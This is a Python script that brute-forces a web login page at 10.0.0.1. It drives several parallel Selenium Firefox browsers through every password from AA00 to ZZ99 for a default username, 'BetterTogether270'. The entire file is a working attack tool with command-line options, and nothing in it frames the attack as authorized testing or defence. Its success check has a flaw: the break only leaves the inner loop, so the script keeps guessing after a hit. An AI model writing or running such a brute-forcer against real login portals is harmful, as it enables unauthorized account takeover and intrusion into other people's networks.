# See LICENSE file.

import concurrent.futures
import logging
from typing import overload

import click
from selenium import webdriver
from selenium.webdriver.common.by import By

LOGIN_URL = "http://10.0.0.1/login"


class PasswordGenerator:
    def __init__(self, start_from: str = "AA00"):
        self.current = self.str2int(start_from)

    def __str__(self) -> str:
        return self.int2str(self.current)

    @classmethod
    def int2str(cls, number: int) -> str:
        answer: list[str] = ["_1", "_2", "_3", "_4"]

        answer[3] = chr(ord("0") + number % 10)
        number //= 10
        answer[2] = chr(ord("0") + number % 10)
        number //= 10
        answer[1] = chr(ord("A") + number % 26)
        number //= 26
        answer[0] = chr(ord("A") + number % 26)
        number //= 26

        return "".join(answer)

    @classmethod
    def str2int(cls, string: str) -> int:
        number = 0

        number *= 26
        number += ord(string[0]) - ord("A")
        number *= 26
        number += ord(string[1]) - ord("A")
        number *= 10
        number += ord(string[2]) - ord("0")
        number *= 10
        number += ord(string[3]) - ord("0")

        return number

    def increment(self) -> None:
        if str(self) == "ZZ99":
            raise ValueError(f"impossible to increment: {self} already.")
        self.current += 1


class Bruteforcer:
    def __init__(
        self,
        username: str,
        logger: logging.Logger,
        browser_number: int,
        startswith: str,
    ):
        self.username = username
        self.password_generator = PasswordGenerator(startswith)
        self.logger = logger
        self.logger.info("opening %d browsers...", browser_number)
        self.executor = concurrent.futures.ThreadPoolExecutor(browser_number)
        self.browsers = [webdriver.Firefox() for _ in range(browser_number)]
        # self.browsers = self.executor.map(webdriver.Firefox, [()] * browser_number)

    def perform_login(
        self,
        password: str,
        browser: webdriver.Firefox,
    ) -> bool:
        browser.get(LOGIN_URL)

        username_field = browser.find_element(By.XPATH, "/html/body/form[2]/input[3]")
        username_field.send_keys(self.username)
        password_field = browser.find_element(By.XPATH, "/html/body/form[2]/input[4]")
        password_field.send_keys(password)
        submit_button = browser.find_element(By.NAME, "submit")
        submit_button.click()

        return browser.title != "Login"

    def run(self) -> None:
        while True:
            futures: list[concurrent.futures.Future] = []
            for browser in self.browsers:
                self.logger.info(
                    "trying (username: %s, password: %s)",
                    self.username,
                    str(self.password_generator),
                )
                futures.append(
                    self.executor.submit(
                        self.perform_login,
                        str(self.password_generator),
                        browser,
                    )
                )
                self.password_generator.increment()
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    self.logger.info("success!")
                    break


@click.command()
@click.option("--browsers", default=1, help="Number of browsers.")
@click.option("--startswith", default="AA00", help="The first password to check.")
@click.option("--username", default="BetterTogether270", help="Username to bruteforce.")
def main(browsers: int, startswith: str, username: str):
    logger = logging.getLogger("bettertogether")
    logger.addHandler(logging.StreamHandler())
    logger.setLevel(logging.INFO)
    bruteforcer = Bruteforcer(username, logger, browsers, startswith)
    bruteforcer.run()


if __name__ == "__main__":
    main()
